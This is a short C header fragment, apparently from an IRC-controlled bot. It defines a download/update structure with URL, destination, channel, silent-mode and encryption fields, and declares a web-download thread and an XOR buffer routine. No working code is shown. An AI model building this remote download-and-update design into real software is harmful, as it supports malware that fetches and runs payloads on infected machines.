#ifndef NO_DOWNLOAD
// download/update structure
typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL encrypted;
	unsigned long expectedcrc;
	unsigned long filelen;
} ds;

DWORD WINAPI webdownload(LPVOID param);
char *Xorbuff(char *buff,int buffLen);
#endif
